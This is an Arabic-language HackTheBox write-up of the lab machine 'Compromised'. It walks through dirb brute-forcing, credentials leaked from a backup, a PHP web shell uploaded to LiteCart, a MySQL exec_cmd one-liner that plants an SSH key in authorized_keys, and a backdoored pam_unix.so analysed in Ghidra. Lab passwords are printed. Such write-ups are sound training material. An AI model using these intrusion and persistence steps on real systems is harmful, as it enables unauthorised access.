#hacktbebox comp

 ![Desktop View](/img/com/0.png)


_Sammmry :_

‫اثناء recon نجد بعد عملية التخمين على  directory backup 
 نقوم بتحميله والبحث داخله نجد بعد ذلكurl  
 litecart يقودنا الى كلمة السر الخاصة ب 

‫نتسغل litecart للحصول على user بعد ذلك نجد ‫‪pam_unix.so 
 
لنجد كلمة مرور ghidra  نقوم بالبحث داخله باستعمال 

root




- sammmry
- 1 Recon
   - 1.1 nmap
- 2 dirb
   - 2.1 backup
   - 2.2 creeds
- 3 Litecart
   - 3.1 Arbitrary File Upload
   - 3.2 Got shell
- 4 user
   - 4.1 Ssh connect
   - 4.2 User.txt
- 5 Privilege Escalation
   - 5.1 pam_unix.so
   - 5.2 ghidra
‬‬


## 1 Recon

### 1.1 nmap

nmap نبدا بفحص البورتات باستخدام


 ![Desktop View](/img/com/1.png)

 ## 2 dirb


dirb باستخدام directory brute force نقوم بعمل
```
Dirb http://10.10.10.207/
```

 ![Desktop View](/img/com/2.png)

 نقوم بفتحه backup نجد مجلد

### 2.1 backup

 ![Desktop View](/img/com/3.png)
 
   نقوم بفكهtar.gz نجد بداخل المجلد ملف

 ![Desktop View](/img/com/4.png)


 ### 2.2 creeds

login.php بالبحث داخل المجلد نجد داخل 

```
//file_put_contents("./.log2301c9430d8593ae.txt",
"User: ". $_POST['username']. " Passwd: ". $_POST
['password;)]'
```

نقوم باستعراض الملف

http://10.10.10.207/shop/admin/.log2301c9430d93ae.txt


نجد داخله كلمة سر

 ![Desktop View](/img/com/5.png)

## 3 Litecart
Admin theNextGenSt0r3!~

litecart نجرب تسجيل الدخول في


 ![Desktop View](/img/com/6.png)

 تم الدخول بنجاح

 Arbitrary File بعد البحث في جوجل نجد ان التطبيق مصاب ب
Upload

### 3.1 Arbitrary File Upload
نقوم بتحميل 

PHP 7.0-7.3 disable_functions bypass PoC 

من هنا

https://www.exploit-db.com/exploits/47462



![Desktop View](/img/com/7.png)


![Desktop View](/img/com/8.png)

على السيرفر shell نقوم برفع

الى content-type :application/x-php ثم تغير

content-type :application/xml

![Desktop View](/img/com/9.png)


![Desktop View](/img/com/10.png)

### 3.2 Got shell

نتوجه الى shell تم رفع

http://10.10.10.207/shop/vqmod/xml/sl.php?c=ls


![Desktop View](/img/com/11.png)

/etc/passwdنقوم بعرض

![Desktop View](/img/com/12.png)

 /bin/bash/shell يستخدم mysql نجد


بعد البحث في جوجل نجد طريقة الاستغلال 

ssh-keygen نقوم بتوليد

![Desktop View](/img/com/13.png)

server الخاص ب ssh authorized key ثم نحقنه في


```
mysql -u root -pchangethis -e "select exec_cmd('echo your key >
/.ssh/authorized_keys')"
```

![Desktop View](/img/com/14.png)

 الان نتصل بالسيرفرباستخدم الامر

ssh –i key mysql@10.10.10.207

### 4.1 Ssh connect
![Desktop View](/img/com/15.png)

### 4.2 User.txt

نجد كلمة سر mysql بالبحث داخل 
الملفات الموجودة في

NLJE32I$Fe*3


## 5 Privilege Escalation
### 5.1 pam_unix.so


sysadminنستخدمها لدخول ب
بالبحث داخل السيرفر

```
find / -newermt "2020-07-1"! -newermt "2020-09-1" -type f 2>/dev/null
```

 نجد ملف باسم 

 /lib/x86_64-linux-gnu/security/pam_unix.so


نقوم بتحميله ونستخدم هندسة عكسية على هذا الملف حتى نجد كلمة سر
نستخدمها للحصول على

root

![Desktop View](/img/com/16.png)

scpننقل الملف ب

### 5.2 ghidra

نجد كلمة السر ghidra نفتح البرنامج 



![Desktop View](/img/com/17.png)



![Desktop View](/img/com/18.png)


![Desktop View](/img/com/19.png)
